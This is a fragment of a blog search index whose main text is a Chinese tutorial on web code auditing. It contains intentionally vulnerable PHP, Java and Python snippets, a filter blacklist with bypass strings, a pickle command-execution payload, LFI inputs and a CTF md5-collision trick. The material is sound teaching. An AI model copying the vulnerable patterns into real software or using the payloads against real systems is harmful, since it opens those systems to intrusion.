3Oz4Us68UQfeAkZLHofwKAe5iOzB1rDtNKHjN+Uii4NZVEE21Y7UJgoIb3wFSRLg3m4DCAq7M5/AA/kgdO9VcIKRyjZRgE5eYqh+mjqyWOBOe12mFmeYsVslph5gLL/7635fiyIaLzv8HLYnleQD5E1tYfVEhehvEcfrsHIxoIBRuf8TQ1jslFgufTDRJYK3yLCpnCN8D3mMzv9eRYlCZLsx/fLkp9Lnsfr5r1Jvh6Njk]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>linux</tag>
        <tag>docker</tag>
        <tag>pentest</tag>
        <tag>eternalBlue</tag>
        <tag>doublePulsar</tag>
        <tag>java unserialize</tag>
        <tag>weblogic</tag>
        <tag>jenkins</tag>
        <tag>information gathering</tag>
        <tag>mysql</tag>
        <tag>RFI</tag>
        <tag>LFI</tag>
        <tag>webshpere</tag>
        <tag>port</tag>
        <tag>intranet</tag>
        <tag>domain</tag>
        <tag>sql</tag>
        <tag>xss</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计总结]]></title>
    <url>%2F2018%2F02%2F13%2Fcode-audit-summary%2F</url>
    <content type="text"><![CDATA[概述代码审计是企业安全运营以及安全从业者必备的安全基础能力。代码审计在很多时候都需要用到，比如渗透测试、漏洞研究、安全运营等等，它以开放的形式从代码层面寻找漏洞、验证漏洞、修复漏洞。 源代码审计工作利用一定的编程规范和标准，针对应用程序源代码，从结构、脆弱性以及缺陷等方面进行审查，来发现当前应用程序中存在的安全缺陷以及代码的规范性缺陷。 工具 环境搭建(phpstudy) 自动化审计工具 IDE 测试工具(burpsuite、firebug等) 代码编辑器(Sublime、Notepad++、UltraEdit等) 自动化审计工具的分析结果： 事前工作 了解Web应用所采用的编程语言的版本漏洞、语言特性、运行机制。 了解Web应用所采用的框架的结构以及运行流程。 了解Web应用常规的安全漏洞、代码样本以及修复方案。 了解Web应用的类型、编码方式等。 思路在团队工作中，采用标准化的编码方式、注释尤为重要，这样可以提高代码的可读性，降低后期修改代码的难度。对企业应用、CMS进行代码审计也可以充分利用这一点。 在代码审计之前先查看整个代码的目录结构，例如文件的命名、修改时间、大小等。因为根据这些文件的命名我们可以大概知道这个程序实现了哪些功能、核心文件是什么等等。 从上图基本可以看出config目录是配置文件、controllers是控制器、helper是辅助函数、models是模型、view是视图、third_party是第三方组件、language肯定和语言有关等等。 然后再根据通用的思路来进行审计： 查看Web应用所采用的框架、第三方库是否存在安全漏洞。对于Web应用而言，大多是都是采用网上现成的成熟的框架进行开发的，也会经常会调用第三方组件。这个时候我们就要关注它所采用的框架、第三方组件是否存在安全漏洞。 比如Struts、Spring、ThinkPHP、Django等框架的漏洞以及Apache Common Collection等第三方组件的漏洞。 这些可以根据框架/第三方组件的名称、版本来进行查询。 查看公共函数、拦截函数是否存在安全漏洞或者可以绕过的风险。一般情况下，公共函数、拦截函数在文件、函数命名上会包含common、function、filter、safe、check等关键词，然后提供给其他文件统一调用。可以查看此类函数的安全机制是否存在绕过的可能性： Java可查看全局文件web.xml 下面是一个过滤器的函数代码： 12345678910// Javapublic class RequestEncodingFilter implements Filter &#123; ... try&#123; invalidInputPattern = myComplier.complie(&quot;&lt;[\\s\\x00]*SCRIPT|SELECT\\s|INSERT\\s|DELETE\\s|UPDATE\\s|DROP\\s|&lt;!--|--&gt;|&lt;FRAME|&lt;IFRAME|&lt;FRAMESET|&lt;NOFRAME|&lt;PLAINTEXT|&lt;A\\s|&lt;LINK|&lt;MAP|&lt;BGSOUND|&lt;IMG|&lt;FORM|&lt;INPUT|&lt;SELECT|&lt;OPTION|&lt;TEXTAREA|&lt;APPLET|&lt;OBJECT|&lt;EMBED|&lt;NOSCRIPT|&lt;STYLE|ALERT[\\s\\x00]*\\(|&lt;|&gt;|\&quot;&quot;); &#125; catch(Exception err)&#123; invalidInputPattern = null; &#125; ...&#125; 可以看到，如果存在SQL注入漏洞，可用/**/代替空格的方式绕过，例如：SELECT/**/id/**/From/**/table的方式绕过，另外对于标签内利用on事件进行XSS 也没有拦截作用，例如: 1’ onclick=confirm`1` xx=’ 查看敏感函数，回溯变量，判断变量是否在调用前进行过严格的安全过滤。根据敏感函数来逆向追踪参数的传递过程，这是目前来说最为常用的一种方式。因为大多是的漏洞都是因为函数的使用不当或者在函数使用前安全处理不够所造成的。 12345// PHP......$str = @(string)$_GET[&apos;str&apos;];eval(&apos;$str=&quot;&apos;.addslashes($str).&apos;&quot;;&apos;);...... 虽然这里用addslashes()函数进行了过滤，但是提交的php代码可以这样在双引号中被执行： 当然还有一些比如SQL注入等问题可以直接通过搜索select、insert等关键词来进行审计的: 123456// Java......Statement statement = con.createStatement();String sql = &quot;select * from users where id=&apos;&quot; + id + &quot;&apos;&quot;;ResultSet rs = statement.executeQuery(sql);...... 找到关键点后然后一步一步逆向查看关键变量是否可控。 查看敏感功能点，正向追踪变量传递过程。有了一定的渗透、代码审计经验之后，就会知道哪些功能点会存在哪些问题。 例如：PHPCMS任意前台用户密码重置漏洞 基础知识Web框架Web 应用框架，是一种开发框架，主要用来支持动态网站、网络应用程序以及网络服务的开发。 常见的框架如下所示： Java: Struts、SpringPHP: ThinkPHP、CodeIgniter、YiiPython: Django、Tornado Web框架模式: MVC是最常见的开发架构，它强制性的使应用程序的输入、处理和输出分开。使用MVC应用程序被分成三个核心部件：模型、视图、控制器。它们各自处理自己的任务，最典型的MVC就是JSP + servlet + javabean的模式。 框架的安全特质: 拦截器 CSRF防护 SQL注入防护 XSS防护 … 虽然大部分框架都具有一些安全特质，但是毕竟代码还是人写的，开发者如果对框架以及安全了解不足，还是会用自己的编码习惯而不是采用框架提供的安全函数去编写Web应用，那么常规的漏洞还是可能会出现的。 还有一些Web应用可能是自己团队开发的框架，但是八九不离十，还是按照前面提到的思路来。 编码这里特地要提一下统一编码的重要性，前后端的编码不一致会引发诸多的安全问题（php与mysql交互过程中发生的编码转换导致SQL宽字节注入等）。 用户可控变量基于一切输入都是不可信任的原则，要对所有的外来输入都要进行安全过滤、验证。 用户可控变量包括用户所在的客户端能够提交的变量：例如GET、POST、COOKIE、Referer、Content-Type、User-Agent、Host以及X-FORWARDED-FOR、Proxy等等。 1234567891011POST /storage/1.5/499041/storage/tabs?batch=true&amp;commit=true HTTP/1.1Host: xxx.xxx.comUser-Agent: Firefox/54.0.1 (Windows NT 10.0; WOW64) FxSync/1.56.0.20170628075643.desktopAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Content-Type: text/plainConnection: closePragma: no-cacheCache-Control: no-cache[&#123;&quot;payload&quot;:&quot;&#123;\&quot;ciphertext\&quot;:\&quot;JLIhhuoBa4AkbFGxBTSfltZD+xy95wdQzq5nPPxZqWs4bpuYxmG1tmX8GXxd3eGS8U3cf6qilhRwqbnxGyfTwFXLnW8uVjzaHpnijtkIkS6zJltyKCDVUKz/JHiHHcOAJ0SVT2VXsJBjl2LiCDTR+A==\&quot;,\&quot;IV\&quot;:\&quot;nOnwHS0aT7EPa+6CQip9HQ==\&quot;,\&quot;hmac\&quot;:\&quot;33f54d9e80834afecd1e05966c9aafb27ab72b2c8a80e87769bb328f43446229\&quot;&#125;&quot;,&quot;id&quot;:&quot;5FXzEHRBZX2y&quot;,&quot;ttl&quot;:1814400&#125;] 正因为用户可以控制JS，所以所有的安全过滤均要在服务器端完成。 PHP配置文件对于PHP，在代码审计之前需要了解PHP官方配置说明。 这些模式决定着一个 PHP 的指令在何时何地，是否能够被设定。手册中的每个指令都有其所属的模式。例如有些指令可以在 PHP 脚本中用 ini_set() 来设定，而有些则只能在 php.ini 或 httpd.conf 中。 例如 output_buffering 指令是属于 PHP_INI_PERDIR，因而就不能用 ini_set() 来设定。但是 display_errors 指令是属于 PHP_INI_ALL 因而就可以在任何地方被设定，包括 ini_set()。 PHPINI* 模式的定义： 模式 含义 PHP_INI_USER 可在用户脚本（例如 ini_set()）或Windows注册表（自PHP5.3起）以及.user.ini中设定 PHP_INI_PERDIR 可在 php.ini，.htaccess 或 httpd.conf 中设定 PHP_INI_SYSTEM 可在 php.ini 或 httpd.conf 中设定 PHP_INI_ALL 可在任何地方设定 具体可以根据首页文件index.php ,了解程序运作时调用哪些函数和文件 以index.php文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入其功能文件夹的首页文件，进扩展阅读。 PHP版本姿势官方版本变更说明 php5.2以前： __autoload加载类文件，但只能调用一次这个函数，所以可以用spl_autoload_register加载类 php5.3: 新增了glob://和phar://流包装glob用来列目录，绕过open_baedirphar在文件包含中可以用来绕过一些后缀的限制 新的全局变量DIR 默认开启&lt;?= $xxoo;?&gt;， 5.4也可用 php5.4: 移除安全模式、魔术引号 register_globals 和 register_long_arrays php.ini 指令被移除。 php.ini新增session.upload_progress.enabled，默认为1，可用来文件包含 php5.5: 废除preg_replace的/e模式(不是移除)当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL) 然后进行后向引用替换。 php5.6: 使用 … 运算符定义变长参数函数 php7.0: 十六进制字符串不再是认为是数字 移除asp和script php标签1&lt;% %&gt;&lt;%= %&gt;&lt;script language=&quot;php&quot;&gt;&lt;/script&gt; php7.1:1、废除mb_ereg_replace()和mb_eregi_replace()的Eval选项 PHP 其他注意点 php可以解析的文件后缀：php php4 php5 php6 phtml pht phps（部分要配置过） 当.或者[]之类的符号作为参数的key值时，会被php改写为_符号，但是QUERY_STRING为用户提交的内容，所以不能修改 PHP的魔术方法 ….. 变量用户可以直接控制的变量： 123456789101112131415$_GET：http://localhost/mm.php?a=xxxxx$_POST:$_COOKIE: 记录在我们本地浏览器中的变量，是可控的。PHP中还有一个变量$_SESSION。 每个人访问网站，他的phpsessid都是不一样的，这个值就用来区分每个用户。服务器用PHPSESSID=cmebf7jkflu5a31vf67kbiopk4来标示每个用户，是否登录或者是否是管理员。$_FILES: 可能产生的漏洞类型： 01.上传漏洞，上传一个php木马，相当于直接getshell了 02.注入，有些cms会把name的值保存在数据库里，但又没有对name进行过滤。$_SERVER:其中部分我们可以控制。 X-FORWARDED-FOR：IP地址，很多cms取ip是首先取这个变量中的值，如果没有这个变量，才去取我们的真实Ip. Referer：来源地址，我们访问目标页面的来源 Host：目标网址这几个变量就是我们php中间用户可以控制的变量。 大部分的漏洞都是 从这几个变量开始展开的。$_REQUEST 就是$GET/$_POST/$COOKIE Java一般的web工程中都会用到web.xml，web.xml主要用来配置，可以方便的开发web工程。web.xml主要用来配置Filter、Listener、Servlet等。但是要说明的是web.xml并不是必须的，一个web工程可以没有web.xml文件。 经过个人测试，WEB工程加载顺序与元素节点在文件中的配置顺序无关。即不会因为 filter 写在 listener 的前面而会先加载 filter。WEB容器的加载顺序是：ServletContext -&gt; context-param -&gt; listener -&gt; filter -&gt; servlet。并且这些元素可以配置在文件中的任意位置。 加载过程顺序如下： 启动一个WEB项目的时候，WEB容器会去读取它的配置文件web.xml，读取listener&gt;和&lt;context-param&gt;两个结点。 紧急着，容创建一个ServletContext（servlet上下文），这个web项目的所有部分都将共享这个上下文。 容器将&lt;context-param&gt;转换为键值对，并交给servletContext。 容器创建&lt;listener&gt;中的类实例，创建监听器。 &lt;context-param&gt;上下文参数12345&lt;context-param&gt; &lt;param-name&gt;ContextParameter&lt;/para-name&gt; &lt;param-value&gt;test&lt;/param-value&gt; &lt;description&gt;It is a test parameter.&lt;/description&gt;&lt;/context-param&gt; &lt;filter&gt;过滤器将一个名字与一个实现javaxs.servlet.Filter接口的类相关联。 123456789101112&lt;filter&gt; &lt;filter-name&gt;setCharacterEncoding&lt;/filter-name&gt; &lt;filter-class&gt;com.myTest.setCharacterEncodingFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;UTF-8&lt;/param-value&gt; &lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;setCharacterEncoding&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; &lt;listener&gt;监听器123&lt;listener&gt; &lt;listerner-class&gt;com.listener.SessionListener&lt;/listener-class&gt; &lt;/listener&gt; &lt;servlet&gt; &lt;servlet&gt;&lt;/servlet&gt; 用来声明一个servlet的数据，主要有以下子元素： &lt;servlet-name&gt;&lt;/servlet-name&gt; 指定servlet的名称 &lt;servlet-class&gt;&lt;/servlet-class&gt; 指定servlet的类名称 &lt;jsp-file&gt;&lt;/jsp-file&gt; 指定web站台中的某个JSP网页的完整路径 &lt;init-param&gt;&lt;/init-param&gt; 用来定义参数，可有多个init-param。在servlet类中通过getInitParamenter(String name)方法访问初始化参数 &lt;load-on-startup&gt;&lt;/load-on-startup&gt;指定当Web应用启动时，装载Servlet的次序。当值为正数或零时：Servlet容器先加载数值小的servlet，再依次加载其他数值大的servlet 当值为负或未定义：Servlet容器将在Web客户首次访问这个servlet时加载它。 &lt;servlet-mapping&gt;&lt;/servlet-mapping&gt; 用来定义servlet所对应的URL，包含两个子元素 &lt;servlet-name&gt;&lt;/servlet-name&gt; 指定servlet的名称 &lt;url-pattern&gt;&lt;/url-pattern&gt; 指定servlet所对应的URL 1234567891011121314151617181920212223242526&lt;!-- 基本配置 --&gt;&lt;servlet&gt; &lt;servlet-name&gt;snoop&lt;/servlet-name&gt; &lt;servlet-class&gt;SnoopServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;snoop&lt;/servlet-name&gt; &lt;url-pattern&gt;/snoop&lt;/url-pattern&gt;&lt;/servlet-mapping&gt;&lt;!-- 高级配置 --&gt;&lt;servlet&gt; &lt;servlet-name&gt;snoop&lt;/servlet-name&gt; &lt;servlet-class&gt;SnoopServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;foo&lt;/param-name&gt; &lt;param-value&gt;bar&lt;/param-value&gt; &lt;/init-param&gt; &lt;run-as&gt; &lt;description&gt;Security role for anonymous access&lt;/description&gt; &lt;role-name&gt;tomcat&lt;/role-name&gt; &lt;/run-as&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;snoop&lt;/servlet-name&gt; &lt;url-pattern&gt;/snoop&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 设置jsp&lt;jsp-config&gt; 包括 &lt;taglib&gt; 和 &lt;jsp-property-group&gt; 两个子元素。其中&lt;taglib&gt;元素在JSP 1.2 时就已经存在；而` 是JSP 2.0 新增的元素。 `元素主要有八个子元素，它们分别为： &lt;description&gt;：设定的说明 &lt;display-name&gt;：设定名称 &lt;url-pattern&gt;：设定值所影响的范围，如： /CH2 或 /*.jsp &lt;el-ignored&gt;：若为 true，表示不支持 EL 语法 &lt;scripting-invalid&gt;：若为 true，表示不支持 &lt;% scripting %&gt;语法 &lt;page-encoding&gt;：设定 JSP 网页的编码 &lt;include-prelude&gt;：设置 JSP 网页的抬头，扩展名为 .jspf &lt;include-coda&gt;：设置 JSP 网页的结尾，扩展名为 .jspf 12345678910111213141516&lt;jsp-config&gt; &lt;taglib&gt; &lt;taglib-uri&gt;Taglib&lt;/taglib-uri&gt; &lt;taglib-location&gt;/WEB-INF/tlds/MyTaglib.tld&lt;/taglib-location&gt; &lt;/taglib&gt; &lt;jsp-property-group&gt; &lt;description&gt;Special property group for JSP Configuration JSP example.&lt;/description&gt; &lt;display-name&gt;JSPConfiguration&lt;/display-name&gt; &lt;url-pattern&gt;/jsp/* &lt;/url-pattern&gt; &lt;el-ignored&gt;true&lt;/el-ignored&gt; &lt;page-encoding&gt;GB2312&lt;/page-encoding&gt; &lt;scripting-invalid&gt;true&lt;/scripting-invalid&gt; &lt;include-prelude&gt;/include/prelude.jspf&lt;/include-prelude&gt; &lt;include-coda&gt;/include/coda.jspf&lt;/include-coda&gt; &lt;/jsp-property-group&gt;&lt;/jsp-config&gt; PythonPython 的Web框架我目前只接触了django，Django参照于MVC模式，但又不完全相同。它一般被称为MTV模式（Model数据存取层、Template表现层、View业务逻辑层）。它的路由一般都在urls.py中配置，框架其他情况可以去网上搜索其教程。 漏洞文件操作漏洞文件上传文件上传过程中，通常因为未校验上传文件后缀类型，或者中间件解析问题，导致用户可上传php等一些webshell文件。代码审计时可重点关注对上传文件类型是否有足够安全的校验，以及是否限制文件大小等。 应用场景：图片上传、附件上传等。 关键词/接口/类包： 1234567// JavaMultipartFile...// PHPmove_uploaded_file()getimagesize() 修复方案： 使用白名单校验上传文件类型、大小限制。 对上传文件名（包括后缀）进行重命名。 将文件统一存放至文件服务器。 文件读取关键词/接口/类包： 12345678910111213141516171819// PHPhightlight_file($filename);show_source($filename);print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); // var_dumpfread(fopen(filename,&quot;r&quot;),filename,&quot;r&quot;),size);include($filename); // 非php代码include_once($filename); // 非php代码require($filename); // 非php代码require_once($filename); // 非php代码print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOFprint_r(fgetcsv(fopen(filename,&quot;r&quot;),filename,&quot;r&quot;),size));print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组 文件包含php支持的协议可以查阅官方手册 漏洞代码示例-1： 123456// PHP12345&lt;?phpinclude($_GET[&apos;file&apos;].&apos;.php&apos;);//?file=2.txt%00 【PHP版本小于5.3】 漏洞代码示例-2： 123456// PHP12345&lt;?phpinclude($_GET[&apos;file&apos;]);//?file=php://filter/convert.base64.encode(内容被base64编码)/resource=example.txt 关键词/接口/类包： 12345678910// PHPfopen()file_get_contents()curl_exec()readfile()require()require_once()include()include_once()allow_url_include = on 文件删除关键词/接口/类包： 123// PHPunlink()session_destroy() 目录列举关键词/接口/类包： 123456// PHPprint_r(glob(&quot;*&quot;)); // 列当前目录print_r(glob(&quot;/*&quot;)); // 列根目录 print_r(scandir(&quot;.&quot;));print_r(scandir(&quot;/&quot;));$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125; 代码/命令执行代码执行函数应用场景：需要自定义执行系统代码的地方。 漏洞代码实实例-1： 123// Pythonimport cPicklecPickle.loads(&quot;cos\nsystem\n(S&apos;uname -a&apos;\ntR.&quot;) 漏洞代码实实例-2： 123456789101112131415// Python@login_required@permission_required(&quot;accounts.newTask_assess&quot;)def targetLogin(request): req = simplejson.loads(request.POST[&apos;loginarray&apos;]) req=unicode(req).encode(&quot;utf-8&quot;) loginarray=eval(req) p=_e(request,&apos;ipList&apos;) #targets=base64.b64decode(targets) (iplist1,iplist2)=getIPTwoList(ip) iplist1=list(set(iplist1)) iplist2=list(set(iplist2)) loginlist=[] delobjs=[] holdobjs=[] 关键词/接口/类包： 1234567891011121314151617// Java...// PHPeval()assert()preg_replace + &apos;/e&apos;call_user_func()call_user_func_array()create_functionarray_map()...// Pythonevalpickle.loads 修复方案： 避免命令用户可控 如需用户输入参数，则对用户输入做严格校验，如&amp;&amp;、|、;等 命令执行漏洞由于业务需求，程序有可能要执行系统命令的功能，但如果执行的命令用户可控，业务上有没有做好限制，就可能出现命令执行漏洞。 应用场景：需要执行系统命令的地方。 漏洞代码示例-1： 1234567// Pythondef myserve(request, filename, dirname): re = serve(request=request,path=filename,document_root=dirname,show_indexes=True) filestr=&apos;authExport.dat&apos; re[&apos;Content-Disposition&apos;] = &apos;attachment; filename=&quot;&apos; + urlquote(filestr) +&apos;&quot;&apos;fullname=os.path.join(dirname,filename) os.system(&apos;sudo rm -f %s&apos;%fullname) return re 关键词/接口/类包： 12345678910111213141516171819202122232425// JavaRuntime.execProcessBuilder.startGroovyShell.evaluate...// PHPsystem()passthru()exec()pcntl_exec()shell_exec()popen()proc_open()`(反单引号)ob_start()escapeshellcmd() // 该函数用于过滤....// Pythonos.systemos.popencommands.getoutputcommands.getstatusoutputsubprocess 修复方案： 避免命令用户可控 如需用户输入参数，则对用户输入做严格校验，如&amp;&amp;、|、;等 序列化与反序列化在现有很多的应用当中，需要对某些对象进行序列化，让它们离开内存空间，入驻物理硬盘，以便可以长期保存，其中最常见的是Web服务器中的Session对象。对象的序列化一般有两种用途：把对象的字节序列永久地保存到硬盘上，通常存放在一个指定文件中；或者在网络上传送对象的字节序列。 而把字节序列恢复为对象的过程称为对象的反序列化。当两个进程在进行远程通信时，彼此可以发送各种类型的数据，而且无论是何种类型的数据，都会以二进制序列的形式在网络上传送。发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。 当应用代码从用户接受序列化数据，并试图反序列化改数据进行下一步处理时，会产生反序列化漏洞，其中最有危害性的就是远程代码注入。 这种漏洞产生原因是，执行反序列化时，并不会对自身的输入进行检查，这就说明恶意攻击者可能也可以构建特定的输入，在反序列化之后会产生非正常结果，利用这一方法就可以实现远程执行任意代码。 在PHP中注意wakeup绕过问题。 关键词/接口/类包： 12345678910111213// JavaObjectInputStream.readObjectObjectInputStream.readUnsharedXMLDecoder.readObjectYaml.loadXStream.fromXMLObjectMapper.readValueJSON.parseObject// PHPserialize()unserialize()ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;); 修复方案： 禁止JVM执行外部命令，是一个简单有效的提高JVM安全性的办法。可以考虑在代码安全扫描时，加强对命令执行等相关代码的检测。也可在反序列化时设置白名单，对于一些只提供接口的库则可使用黑名单设置不允许被反序列化类或者提供设置白名单的接口 SQL注入漏洞注入攻击的本质，是程序把用户输入的数据当做的Sql代码执行。这里有两个关键条件，第一是用户能够控制输入；第二是用户输入的数据被拼接到要执行的Sql代码中从而被执行。sql注入漏洞则是程序将用户输入数据拼接到了sql语句中，从而攻击者即可构造、改变sql语义从而进行攻击。 应用场景：数据库操作处使用动态拼接形式。 漏洞代码示例-1： 123456789101112// Pythondef getUsers(user_id=None): conn = psycopg2.connect(&quot;dbname=&apos;××&apos; user=&apos;××&apos; host=&apos;&apos; password=&apos;&apos;&quot;) cur = conn.cursor(cursor_factory=psycopg2.extras.DictCursor) if user_id==None: str = &apos;select distinct * from auth_user&apos; else: str=&apos;select distinct * from auth_user where id=%d&apos;%user_id res = cur.execute(str) res = cur.fetchall() conn.close() return res 关键词/接口/类包： 这个比较容易寻找，只要找sql查询的关键词即可。 12345selectdelectinsertupdate... 修复方案： 框架所提供的Sql安全语法 避免使用动态拼接形式 采用预编译的方式。 统一编码（UTF-8） XSS存储型XSS和反射XSS基本没什么区别，就是中间经过了数据库。 而DOM型XSS主要关于html以及js代码中有没有相关的拼接、打印操作。 应用场景：将从客户端接受的数据未经过滤直接打印到页面上。 漏洞代码实例-1： 1234// Pythondef xss_test(request): name = request.GET[&apos;name&apos;] return HttpResponse(&apos;hello %s&apos; %(name)) 修复方案： 对敏感字符进安全过滤。 XML漏洞XML注入原理与SQL注入基本相同，只是改成了xml的形式，例如： 1quantity=1&lt;/quantity&gt;&lt;price&gt;5.0&lt;/price&gt;&lt;quantity&gt;1 XXEXML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。文档类型定义(DTD)的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 当允许引用外部实体时，恶意攻击者即可构造恶意内容访问服务器资源,如读取passwd文件、对外发起请求、DOS等： 应用场景：XML解析一般在导入配置、数据传输接口等场景可能会用到，涉及到XML文件处理的场景可留意下XML解析器是否禁用外部实体，从而判断是否存在XXE。 关键词/接口/类包： 12345678910111213141516// Javajavax.xml.parsers.DocumentBuilderjavax.xml.stream.XMLStreamReaderorg.jdom.input.SAXBuilderorg.jdom2.input.SAXBuilderjavax.xml.parsers.SAXParserorg.dom4j.io.SAXReader org.xml.sax.XMLReaderjavax.xml.transform.sax.SAXSource javax.xml.transform.TransformerFactory javax.xml.transform.sax.SAXTransformerFactory javax.xml.validation.SchemaFactoryjavax.xml.bind.Unmarshallerjavax.xml.xpath.XPathExpression... 修复方案： 使用XML解析器时需要设置其属性，禁止使用外部实体，XML解析器的安全使用可参考文章_Prevention_Cheat_Sheet ) 变量覆盖漏洞漏洞代码示例-1： 12345678910111213141516171819// PHP $$ 变量覆盖&lt;?phpshow_source(__FILE__);include &quot;flag.php&quot;;$_403 = &quot;Access Denied&quot;;$_200 = &quot;Welcome Admin&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;) die(&quot;BugsBunnyCTF is here :p…&quot;);if ( !isset($_POST[&quot;flag&quot;]) ) die($_403);foreach ($_GET as $key =&gt; $value) $$key = $$value;foreach ($_POST as $key =&gt; $value) $$key = $value;if ( $_POST[&quot;flag&quot;] !== $flag ) die($_403);echo &quot;This is your flag : &quot;. $flag . &quot;\n&quot;;die($_200);?&gt; 由于2个foreach的代码会将$flag的值给覆盖掉，所以只能利用第一个foreach先将 $flag的值赋给$_200，然后利用die($_200)将原本的flag值打印出来。 漏洞代码示例-2： 123456789101112131415161718// PHP $$ parse_str()&lt;?phperror_reporting(0);if (empty($_GET[&apos;id&apos;])) &#123; show_source(__FILE__); die();&#125; else &#123; include (&apos;flag.php&apos;); $a = &quot;This is a test.&quot;; $id = $_GET[&apos;id&apos;]; @parse_str($id); if ($a[0] != &apos;QNKCDZO&apos; &amp;&amp; md5($a[0]) == md5(&apos;QNKCDZO&apos;)) &#123; echo $flag; &#125; else &#123; exit(&apos;Error!&apos;); &#125;&#125;?&gt; parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 php弱语言特性，0e123会被当做科学计数法 使用GET请求id=a[0]=240610708，这样会将a[0]的值覆盖为240610708，然后经过md5后得到0e462097431906509019562988736854与md5(‘QNKCDZO’)的结果0e830400451993494058024219903391比较都是0 所以相等，满足条件，得打flag。 关键词/接口/类包： 123456// PHPextract()import_request_variables()parse_str()mb_parse_str()全局变量覆盖：register_globals为ON，$GLOBALS 逻辑漏洞水平/垂直越权越权漏洞可以分为水平、垂直越权两种,程序在处理用户请求时未对用户的权限进行校验，使的用户可访问、操作其他相同角色用户的数据，这种情况是水平越权；如果低权限用户可访问、操作高权限用户则的数据，这种情况为垂直越权。 应用场景：查看文章、修改密码等等。 修复方案：获取当前登陆用户并校验该用户是否具有当前操作权限，并校验请求操作数据是否属于当前登陆用户，当前登陆用户标识不能从用户可控的请求参数中获取。 批量请求业务中经常会有使用到发送短信校验码、短信通知、邮件通知等一些功能，这类请求如果不做任何限制，恶意攻击者可能进行批量恶意请求轰炸，大量短信、邮件等通知对正常用户造成困扰，同时也是对公司的资源造成损耗。 除了短信、邮件轰炸等，还有一种情况也需要注意，程序中可能存在很多接口，用来查询账号是否存在、账号名与手机或邮箱、姓名等的匹配关系，这类请求如不做限制也会被恶意用户批量利用，从而获取用户数据关系相关数据。对这类请求在代码审计时可关注是否有对请求做鉴权、和限制即可大致判断是否存在风险。 应用场景：短信校验码、短信通知、邮件通知等。 修复方案：在服务端对同一个用户发起这类请求的频率、每小时及每天发送量在服务端做限制。 支付漏洞应用场景：支付场景。 重复发包利用时间差： 漏洞代码示例-1： 12345678// PHP&lt;?PHPif(check_money($price))&#123; ... // 数据库取出数据 // 花费几秒 $money = $money - $price ... // 数据库存入数据&#125; 修复方案：完善逻辑。 其他逻辑漏洞这里就要根据业务功能具体问题具体分析了，可以参考下各行业漏洞点。 找回密码 token http://foreversong.cn/archives/899 SSRFSSRF形成的原因大都是由于代码中提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。比如从指定URL链接获取图片、下载等。 应用场景：程序中发起HTTP请求操作一般在获取远程图片、页面分享收藏等业务场景,在代码审计时可重点关注一些HTTP请求操作函数。 关键词/接口/类包： 123456// JavaHttpClient.executeHttpClient.executeMethodHttpURLConnection.connectHttpURLConnection.getInputStreamURL.openStream 修复方案： 使用白名单校验HTTP请求url地址 避免将请求响应及错误信息返回给用户 禁用不需要的协议及限制请求端口,仅仅允许http和https请求等 AutobindingAutobinding-自动绑定漏洞，根据不同语言/框架，该漏洞有几个不同的叫法，如下： Mass Assignment: Ruby on Rails, NodeJS Autobinding: Spring MVC, ASP.NET MVC Object injection: PHP(对象注入、反序列化漏洞) 软件框架有时允许开发人员自动将HTTP请求参数绑定到程序代码变量或对象中，从而使开发人员更容易地使用该框架。这里攻击者就可以利用这种方法通过构造http请求，将请求参数绑定到对象上，当代码逻辑使用该对象参数时就可能产生一些不可预料的结果。 具体参考 URL重定向由于Web站点有时需要根据不同的逻辑将用户引向到不同的页面，如典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致URL重定向问题，攻击者构造恶意跳转的链接，可以向用户发起钓鱼攻击。 应用场景：登录接口等 关键词/接口/类包： 1234// JavasendRedirectsetHeaderforward 修复方案： 使用白名单校验重定向的url地址 给用户展示安全风险提示，并由用户再次确认是否跳转 CSRF跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。 